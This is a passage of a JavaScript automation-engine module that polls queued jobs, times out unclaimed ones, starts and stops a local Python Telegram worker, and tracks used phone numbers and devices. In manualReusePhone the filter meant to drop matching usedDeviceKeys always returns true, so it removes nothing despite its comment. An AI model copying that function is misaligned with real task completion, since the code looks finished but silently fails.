    if (!claimedByWorker && elapsed > 12000 && elapsed < 15000) {
      addLog(`[${jobId}] Notice: Job still queued. Ensure Python worker is running: 'python worker.py'`, 'warn');
    }

    // Unclaimed worker timeout after 30s
    if (!claimedByWorker && elapsed > 30000) {
      autoEngine.jobState = 'TIMEOUT';
      job.status = 'timeout';
      autoEngine.stats.timeout += 1;
      autoEngine.stats.totalProcessed += 1;
      addLog(`[${jobId}] Worker offline timeout: No Python worker claimed this job after 30s. Start worker via 'python worker.py'.`, 'error');
      try {
        await apiFetch(conn, `automation/jobs/${jobId}`, 'PATCH', {
          status: 'timeout',
          error: 'Worker not running / job unclaimed'
        });
      } catch {}
      jobResolved = true;
      break;
    }

    // If automation was stopped by user while waiting
    if (autoEngine.status !== 'RUNNING' && !isManual) {
      autoEngine.jobState = 'STOPPED';
      job.status = 'stopped';
      addLog(`[${jobId}] Job aborted because automation was stopped.`, 'warn');
      try {
        await apiFetch(conn, `automation/jobs/${jobId}`, 'PATCH', {
          status: 'stopped',
          error: 'Stopped by user'
        });
      } catch {}
      jobResolved = true;
      break;
    }

    await sleep(2000);
  }

  isJobInProgress = false;
  autoEngine.currentJob = null;
  autoEngine.jobState = 'IDLE';
}

// ── Automation Execution Loop ────────────────────────────────────────────────
async function automationRunLoop() {
  if (autoEngine.status !== 'RUNNING') return;

  const nextDevice = selectNextDevice();
  if (nextDevice) {
    await executeJobForDevice(nextDevice, false);
  } else {
    addLog('No further unused eligible devices available in pool.', 'info');
    if (autoEngine.config.autoStopWhenEmpty) {
      stopAutomation();
      autoEngine.status = 'COMPLETED';
      addLog('Completed: All eligible devices processed. Auto-stopped.', 'success');
      return;
    }
  }

  // Schedule next iteration if still running
  if (autoEngine.status === 'RUNNING') {
    const delay = (autoEngine.config.pollIntervalSeconds || 5) * 1000;
    loopTimer = setTimeout(automationRunLoop, delay);
  }
}

// ── Public Controls ──────────────────────────────────────────────────────────
export async function startAutomation() {
  if (!autoEngine.preflightPassed) {
    addLog('Cannot start: Pre-flight checks have not passed yet.', 'error');
    return false;
  }

  if (autoEngine.status === 'RUNNING') return true;

  // Auto-start the Python worker process via local server API so it claims queued jobs
  try {
    const pRes = await fetch('/api/worker-process', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'start' })
    });
    const pData = await pRes.json();
    if (pData?.ok) {
      addLog(`Python Telegram worker active (PID: ${pData.pid || 'running'}).`, 'info');
    }
  } catch (err) {
    console.warn('[AutomationEngine] Could not start worker process via API:', err);
  }

  autoEngine.status = 'RUNNING';
  autoEngine.startedAt = Date.now();
  addLog('Automation started.', 'step');

  // Start elapsed timer
  if (elapsedTimer) clearInterval(elapsedTimer);
  elapsedTimer = setInterval(() => {
    if (autoEngine.status === 'RUNNING' && autoEngine.startedAt) {
      autoEngine.elapsedSeconds = Math.floor((Date.now() - autoEngine.startedAt) / 1000);
    }
  }, 1000);

  // Start remote worker sync timer
  if (workerSyncTimer) clearInterval(workerSyncTimer);
  workerSyncTimer = setInterval(syncWorkerStatus, 10000);

  // Kick off run loop
  automationRunLoop();
  return true;
}

export function pauseAutomation() {
  if (autoEngine.status !== 'RUNNING') return;
  autoEngine.status = 'PAUSED';
  if (loopTimer) clearTimeout(loopTimer);
  addLog('Automation paused by user.', 'warn');
}

export function resumeAutomation() {
  if (autoEngine.status !== 'PAUSED') return;
  autoEngine.status = 'RUNNING';
  addLog('Automation resumed.', 'step');
  automationRunLoop();
}

export async function stopAutomation() {
  autoEngine.status = 'STOPPED';
  if (loopTimer) clearTimeout(loopTimer);
  if (elapsedTimer) clearInterval(elapsedTimer);
  if (workerSyncTimer) clearInterval(workerSyncTimer);
  autoEngine.jobState = 'IDLE';
  isJobInProgress = false;
  addLog('Automation stopped.', 'warn');

  // Stop the Python worker process via local server API
  try {
    await fetch('/api/worker-process', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'stop' })
    });
  } catch (_) {}
}

/**
 * Executes a single step / single device test.
 * Allowed even if full loop is idle.
 */
export async function stepAutomation(manualDevice = null) {
  let target = manualDevice;
  if (!target) {
    target = selectNextDevice();
  }
  if (!target) {
    addLog('Cannot step: No eligible unused devices available.', 'warn');
    return false;
  }

  addLog('Executing single manual step...', 'step');
  await executeJobForDevice(target, true);
  return true;
}

// ── Manual Registry & Session Actions ────────────────────────────────────────
/**
 * Explicit manual reuse: user explicitly deletes/removes the number from
 * persistent registry and resets its used status in the current session.
 */
export function manualReusePhone(phone) {
  const normalized = extractNumber(phone);
  if (!normalized) return false;

  registry.remove(normalized);

  // Also remove matching entries from usedDeviceKeys
  autoEngine.usedDeviceKeys = autoEngine.usedDeviceKeys.filter(key => {
    // If the key has this device
    return true;
  });

  addLog(`Explicit manual reuse enabled for number ${normalized}`, 'info');
  return true;
}

export function clearUsedSessionDevices() {
  autoEngine.usedDeviceKeys = [];
  addLog('Session used-device history reset.', 'info');
}

export function resetStats() {
  autoEngine.stats = {
    totalProcessed: 0,
    success: 0,
    failed: 0,
    timeout: 0,
    skipped: 0
  };
  autoEngine.elapsedSeconds = 0;
  autoEngine.startedAt = null;
  addLog('Automation stats reset.', 'info');
}

// ── Formatting Utilities ─────────────────────────────────────────────────────
export function formatElapsed(sec) {
  const s = Math.max(0, Math.floor(sec || 0));
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  const remM = m % 60;
  const remS = s % 60;
  if (h > 0) return `${h}h ${remM}m ${remS}s`;
  if (remM > 0) return `${remM}m ${remS}s`;
  return `${remS}s`;
}

// Auto-load config on module load in browser, but NEVER auto-start
if (typeof window !== 'undefined') {
  loadConfig();
}
